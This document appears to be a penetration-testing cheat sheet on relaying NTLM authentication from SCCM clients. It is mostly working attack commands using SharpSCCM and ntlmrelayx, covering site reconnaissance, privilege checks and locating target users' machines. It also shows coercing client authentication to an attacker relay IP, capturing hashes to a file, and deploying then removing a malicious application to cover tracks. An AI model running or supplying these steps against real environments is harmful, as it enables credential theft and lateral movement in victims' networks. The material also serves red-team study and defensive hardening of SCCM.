# NTLM Relay from SCCM Clients

**Prerequisites :**

* Automatic Site-wide client push installation is enabled
* NTLM is not explicitly disabled

### How ?

> With **access to domain credentials** or a **session** with **Full Administrator** privileges to Microsoft Configuration Manager (or ConfigMgr, formerly System Center Configuration Manager and still commonly referred to as SCCM), you can very likely gain access to any client machine that is online. **But how?** Using WMI queries, the ConfigMgr PowerShell cmdlets, or tools like SharpSCCM, MalSCCM, and PowerSCCM.

### Exploit

{% embed url="https://github.com/Mayyhem/SharpSCCM" %}
SharpSCCM
{% endembed %}

```powershell
SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>
```

#### 1. Preparation

**Identify :**

* the FQDN or NetBIOS name of an SCCM management point server
* the sitecode for the SCCM site.

```powershell
SharpSCCM.exe local siteinfo

# must show something like : 
.\SharpSCCM.exe local siteinfo
[+] Connecting to \\localhost\root\ccm
[+] Executing WQL query: SELECT Name,CurrentManagementPoint FROM SMS_Authority
-----------------------------------
SMS_Authority
-----------------------------------
CurrentManagementPoint: atlas.aperture.sci
Name: SMS:PS1
-----------------------------------
```

* Confirm that the current domain context has the necessary privileges to define a collection of systems and deploy applications to it :

```powershell
SharpSCCM.exe <server> <sitecode> get class-instances SMS_Admin -p CategoryNames -p CollectionNames -p LogonName -p RoleNames

# Full Administrator -> win
# Application Administrator -> win
```

#### 2. Finding Users

{% embed url="https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867" %}

Find :

* systems where our target user has recently logged on
* or which computer is their workstation.

```powershell
# user last logon
SharpSCCM.exe <server> <sitecode> get device -u <username>
```

> The accuracy of the output of this command **should not be treated as fact**. The **LastLogonUser** attribute identifies **the last account that logged into the system at the point in time the last data discovery collection was sent** from the client to the management point (default: every _7 days_), so it is likely going to be stale for devices with multiple daily users.

```powershell
# To find all computers that are linked to a specific user :
SharpSCCM.exe <server> <sitecode> get primary-user -u <username>
```

#### Capture/Relay

```bash
ntlmrelayx.py -smb2support -ts -ip <relay_ip> -t <target_ip> -of ~/hashes.txt
```

* Request NTLM authentication :

```powershell
SharpSCCM.exe <server> <sitecode> exec -d <device_name> -r <relay_server_ip>

# check ntlmrelayx for hashes!

## Prevent timing issues:
.\SharpSCCM.exe <server> <sitecode> 
new collection device <collection_name>
add device-to-collection <device_name> <collection_name>
<wait a few minutes>
new application <application_name> <path_to_application>
new deployment <application_name> <collection_name>
<wait a few more minutes>
invoke update <collection_name>
<cleanup>
remove deployment <application_name> <collection_name>
remove application <application_name>
remove collection <collection_name>
```
